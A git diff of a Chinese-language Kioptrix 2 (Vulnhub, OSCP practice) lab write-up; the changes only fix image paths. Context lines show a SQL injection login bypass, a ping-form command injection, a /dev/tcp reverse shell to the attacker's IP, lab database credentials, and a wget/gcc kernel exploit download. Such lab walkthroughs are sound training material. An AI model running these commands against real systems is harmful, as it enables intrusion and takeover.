@@ -14,7 +14,7 @@
 
 也可以使用`nmap`等工具进行
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-2\1.jpg)
+![](./pic-2/1.jpg)
 
 # 信息收集
 
@@ -22,7 +22,7 @@
 
 这里建议扫描常见端口即可，我尝试扫描全端口，结果导致目标靶机的`ip`地址消失
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-2\2.jpg)
+![](./pic-2/2.jpg)
 
 这里扫描完毕后，`IP`又不见了，哈哈哈哈哈哈哈哈哈，很好，再次重启，这里有点像是真实情况中的限制一样
 
@@ -30,7 +30,7 @@
 
 访问80端口，发现一个类似登录界面
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-2\3.jpg)
+![](./pic-2/3.jpg)
 
 页面源代码中发现这是一个`form`表单，并且交给`index.php`处理
 
@@ -50,13 +50,13 @@ test' or '1'='1
 
 直接进入到另一个界面，这里说是`ping`，测试一下
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-2\4.jpg)
+![](./pic-2/4.jpg)
 
 ## 命令执行
 
 输入`127.0.0.1`，发现确实是执行`ping`，并且是跳转到`pingit.php`界面的
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-2\5.jpg)
+![](./pic-2/5.jpg)
 
 这可能存在命令注入，因为假设拼接上可以触发
 
@@ -74,7 +74,7 @@ test' or '1'='1
 
 输入`127.0.0.1 | ls`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-2\6.jpg)
+![](./pic-2/6.jpg)
 
 ## 反弹shell
 
@@ -86,7 +86,7 @@ test' or '1'='1
 
 然后输入命令`127.0.0.1|bash -i >& /dev/tcp/192.168.1.16/9999 0>&1`并执行，这时候`kali`就会收到一个`shell`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-2\7.jpg)
+![](./pic-2/7.jpg)
 
 # 内网收集
 
@@ -94,7 +94,7 @@ test' or '1'='1
 
 果然，查看就发现了连接`mysql`的`php`函数，`localhost`是主机地址，`john`是连接数据库的用户名，`hiroshima`是密码
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-2\8.jpg)
+![](./pic-2/8.jpg)
 
 发现连接数据库的用户名和密码，那么测试是否存在当前的用户`john`，也就是这是否是只用于数据库连接的，还是为了方便，采用主机的用户
 
@@ -103,11 +103,11 @@ ls -l /home
 cat /etc/passwd | grep john
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-2\9.jpg)
+![](./pic-2/9.jpg)
 
 既然存在，那么测试是否一码多用，尝试进行`ssh`连接，不过这里进行`ssh`连接涉及到一些过时的密钥交换等，所以先在靶机内使用`su`切换进行测试，发现密码错误。
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-2\10.jpg)
+![](./pic-2/10.jpg)
 
 那么登录数据库进行查看数据库中的内容
 
@@ -120,11 +120,11 @@ mysql> show tables;
 mysql> select * from users;
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-2\11.jpg)
+![](./pic-2/11.jpg)
 
 连接数据库的用户名还在里面，这个我觉得可能是靶机用户的密码`66lajGGbla`，进行测试，还是失败
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-2\12.jpg)
+![](./pic-2/12.jpg)
 
 继续收集其他信息，使用`find`寻找具有SUID权限的文件，并无明显可利用的，有一个`sudo`但是测试后需要密码
 
@@ -137,7 +137,7 @@ cat /etc/issue
 cat /etc/issue.bak
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-2\13.jpg)
+![](./pic-2/13.jpg)
 
 # 提权
 
@@ -147,11 +147,11 @@ cat /etc/issue.bak
 searchsploit centos 2.6.9
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-2\14.jpg)
+![](./pic-2/14.jpg)
 
 查看该脚本，发现其测试范围以及机器正好对应的上，并且在靶机上使用`gcc -v`发现安装了`gcc`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-2\15.jpg)
+![](./pic-2/15.jpg)
 
 在`kali`开启一个`python`的简易`http`服务，然后靶机下载到`/tmp`目录
 
@@ -163,7 +163,7 @@ python3 -m http.server 8888
 wget http://192.168.1.16:8888/9542.c
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-2\16.jpg)
+![](./pic-2/16.jpg)
 
 进行编译，然后执行`exp`
 
@@ -171,7 +171,7 @@ wget http://192.168.1.16:8888/9542.c
 gcc -o exp 9542.c
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\kioptrix系列\pic-2\17.jpg)
+![](./pic-2/17.jpg)
 
 
 
